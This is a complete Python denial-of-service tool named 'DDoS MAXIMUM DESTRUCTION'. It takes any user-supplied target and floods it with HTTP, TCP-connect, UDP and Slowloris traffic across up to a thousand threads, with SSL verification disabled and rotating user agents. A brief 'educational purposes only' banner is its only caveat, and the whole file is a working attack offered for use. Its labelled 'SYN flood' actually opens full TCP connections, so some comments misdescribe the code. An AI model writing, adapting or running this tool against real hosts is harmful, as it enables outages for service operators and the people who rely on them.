#!/usr/bin/env python3
# DDoS MAXIMUM DESTRUCTION - PYTHON VERSION

import socket
import threading
import random
import time
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib.request
import urllib.error
import ssl

# Bypass SSL verification
ssl._create_default_https_context = ssl._create_unverified_context

class DDoSAttack:
    def __init__(self):
        self.running = False
        self.attack_start_time = None
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
    def print_banner(self):
        print("""
╔══════════════════════════════════════════════════════════╗
║  ╔═╗╔╦╗╔═╗╔═╗  ╔╗ ╔═╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗╦  ╔═╗╔═╗╔╦╗      ║
║  ╠═╣║║║╠═╝║ ╦  ╠╩╗║ ║║ ║║╣ ║ ║╠╦╝║╣ ║  ║  ║ ║╠═╣ ║║      ║
║  ╩ ╩╩ ╩╩  ╚═╝  ╚═╝╚═╝╚═╝╚═╝╚═╝╩╚═╚═╝╚═╝╩═╝╚═╝╩ ╩═╩╝      ║
║                  PYTHON EDITION v3.0                      ║
╚══════════════════════════════════════════════════════════╝
        """)
        print("[!] WARNING: For educational purposes only!")
        print("[!] Use only on authorized systems!\n")
    
    def http_flood(self, target, port=80, duration=60):
        """HTTP Flood Attack"""
        url = f"http://{target}" if not target.startswith('http') else target
        timeout = time.time() + duration
        
        while self.running and time.time() < timeout:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, timeout=5)
                self.successful_requests += 1
                self.log_request(f"HTTP Flood: Sent to {target} - Status: {response.status}")
                
            except Exception as e:
                self.failed_requests += 1
                self.log_request(f"HTTP Flood: Failed - {str(e)}")
            
            self.total_requests += 1
            time.sleep(0.01)  # Small delay to avoid self-DoS
    
    def tcp_syn_flood(self, target, port=80, duration=60):
        """TCP SYN Flood Attack"""
        timeout = time.time() + duration
        
        while self.running and time.time() < timeout:
            try:
                # Create raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Send SYN packet
                sock.connect((target, port))
                sock.send(b'GET / HTTP/1.1\r\n\r\n')
                self.successful_requests += 1
                self.log_request(f"TCP SYN: Sent to {target}:{port}")
                sock.close()
                
            except Exception as e:
                self.failed_requests += 1
                self.log_request(f"TCP SYN: Failed - {str(e)}")
            
            self.total_requests += 1
            time.sleep(0.005)  # Faster for SYN flood
    
    def udp_flood(self, target, port=53, duration=60):
        """UDP Flood Attack"""
        timeout = time.time() + duration
        
        while self.running and time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random data
                data = random._urandom(1024)
                sock.sendto(data, (target, port))
                self.successful_requests += 1
                self.log_request(f"UDP Flood: Sent 1KB to {target}:{port}")
                sock.close()
                
            except Exception as e:
                self.failed_requests += 1
                self.log_request(f"UDP Flood: Failed - {str(e)}")
            
            self.total_requests += 1
    
    def slowloris_attack(self, target, port=80, duration=60):
        """Slowloris Attack - Keep connections open"""
        timeout = time.time() + duration
        sockets = []
        
        # Create multiple connections
        for i in range(50):
            if not self.running or time.time() > timeout:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target, port))
                
                # Send partial request
                sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept: text/html\r\n".encode())
                sockets.append(sock)
                self.successful_requests += 1
                self.log_request(f"Slowloris: Connection #{i+1} opened")
                
            except Exception as e:
                self.failed_requests += 1
        
        # Keep connections alive
        while self.running and time.time() < timeout:
            for sock in sockets:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(10)  # Send keep-alive header every 10 seconds
                except:
                    pass
            
            time.sleep(1)
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def mixed_attack(self, target, port=80, duration=60):
        """Mixed Attack - All methods combined"""
        threads = []
        
        # Start HTTP Flood
        t1 = threading.Thread(target=self.http_flood, args=(target, port, duration))
        t1.start()
        threads.append(t1)
        
        # Start TCP SYN Flood
        t2 = threading.Thread(target=self.tcp_syn_flood, args=(target, port, duration))
        t2.start()
        threads.append(t2)
        
        # Start UDP Flood
        t3 = threading.Thread(target=self.udp_flood, args=(target, 53, duration))
        t3.start()
        threads.append(t3)
        
        # Start Slowloris
        t4 = threading.Thread(target=self.slowloris_attack, args=(target, port, duration))
        t4.start()
        threads.append(t4)
        
        # Wait for all threads
        for t in threads:
            t.join()
    
    def log_request(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def show_stats(self):
        """Show real-time statistics"""
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            
            if self.attack_start_time:
                elapsed = time.time() - self.attack_start_time
                requests_per_sec = self.total_requests / elapsed if elapsed > 0 else 0
                success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
                
                print(f"""
╔══════════════════════════════════════════════════════════╗
║                       ATTACK STATS                       ║
╠══════════════════════════════════════════════════════════╣
║  Total Requests:  {self.total_requests:>12,}            ║
║  Successful:      {self.successful_requests:>12,}            ║
║  Failed:          {self.failed_requests:>12,}            ║
║  Requests/sec:    {requests_per_sec:>12.1f}            ║
║  Success Rate:    {success_rate:>11.1f}%            ║
║  Elapsed Time:    {elapsed:>11.1f}s            ║
║  Attack Status:   {'RUNNING' if self.running else 'STOPPED':>12}            ║
╚══════════════════════════════════════════════════════════╝
                """)
            
            time.sleep(1)
    
    def start_attack(self, target, method='mixed', threads=100, duration=60, port=80):
        """Start DDoS Attack"""
        self.running = True
        self.attack_start_time = time.time()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        print(f"\n[+] Starting attack on: {target}")
        print(f"[+] Method: {method}")
        print(f"[+] Threads: {threads}")
        print(f"[+] Duration: {duration} seconds")
        print(f"[+] Port: {port}")
        print("\n[!] Press Ctrl+C to stop attack\n")
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            # Start attack threads
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    if method == 'http':
                        executor.submit(self.http_flood, target, port, duration)
                    elif method == 'tcp':
                        executor.submit(self.tcp_syn_flood, target, port, duration)
                    elif method == 'udp':
                        executor.submit(self.udp_flood, target, port, duration)
                    elif method == 'slowloris':
                        executor.submit(self.slowloris_attack, target, port, duration)
                    elif method == 'mixed':
                        executor.submit(self.mixed_attack, target, port, duration)
            
            # Wait for completion
            time.sleep(duration)
            
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop DDoS Attack"""
        self.running = False
        time.sleep(2)  # Give threads time to stop
        
        # Final statistics
        if self.attack_start_time:
            total_time = time.time() - self.attack_start_time
            requests_per_sec = self.total_requests / total_time if total_time > 0 else 0
            success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
            
            print(f"""
╔══════════════════════════════════════════════════════════╗
║                     ATTACK COMPLETED                     ║
╠══════════════════════════════════════════════════════════╣
║  Total Requests:  {self.total_requests:>12,}            ║
║  Successful:      {self.successful_requests:>12,}            ║
║  Failed:          {self.failed_requests:>12,}            ║
║  Requests/sec:    {requests_per_sec:>12.1f}            ║
║  Success Rate:    {success_rate:>11.1f}%            ║
║  Total Time:      {total_time:>11.1f}s            ║
╚══════════════════════════════════════════════════════════╝
            """)
        
        print("[+] Attack finished")

def main():
    attack = DDoSAttack()
    attack.print_banner()
    
    try:
        # Get target
        target = input("[?] Enter target URL/IP: ").strip()
        if not target:
            print("[!] Target is required!")
            return
        
        # Remove http:// or https:// if present
        target = target.replace('http://', '').replace('https://', '').replace('/', '')
        
        # Get method
        print("\n[?] Select attack method:")
        print("  1) HTTP Flood (Layer 7)")
        print("  2) TCP SYN Flood (Layer 4)")
        print("  3) UDP Flood (Layer 4)")
        print("  4) Slowloris (Keep-alive)")
        print("  5) MIXED (All methods)")
        
        method_choice = input("[?] Choose (1-5): ").strip()
        methods = {
            '1': 'http',
            '2': 'tcp',
            '3': 'udp',
            '4': 'slowloris',
            '5': 'mixed'
        }
        method = methods.get(method_choice, 'mixed')
        
        # Get threads
        try:
            threads = int(input("[?] Number of threads (50-1000): ").strip() or "100")
            threads = max(50, min(1000, threads))
        except:
            threads = 100
        
        # Get duration
        try:
            duration = int(input("[?] Attack duration in seconds: ").strip() or "60")
            duration = max(10, min(3600, duration))
        except:
            duration = 60
        
        # Get port
        try:
            port = int(input("[?] Target port (default 80): ").strip() or "80")
        except:
            port = 80
        
        # Confirm
        print(f"\n[!] CONFIRM ATTACK:")
        print(f"    Target: {target}")
        print(f"    Method: {method.upper()}")
        print(f"    Threads: {threads}")
        print(f"    Duration: {duration}s")
        print(f"    Port: {port}")
        
        confirm = input("\n[?] Start attack? (y/N): ").strip().lower()
        if confirm != 'y':
            print("[!] Attack cancelled")
            return
        
        # Start attack
        attack.start_attack(target, method, threads, duration, port)
        
    except KeyboardInterrupt:
        print("\n[!] Cancelled by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Check if running as root (for raw socket access)
    if os.name != 'nt' and os.geteuid() != 0:
        print("[!] Warning: Running without root privileges may limit attack effectiveness")
        print("[!] Consider running with: sudo python3 ddos.py")
    
    main()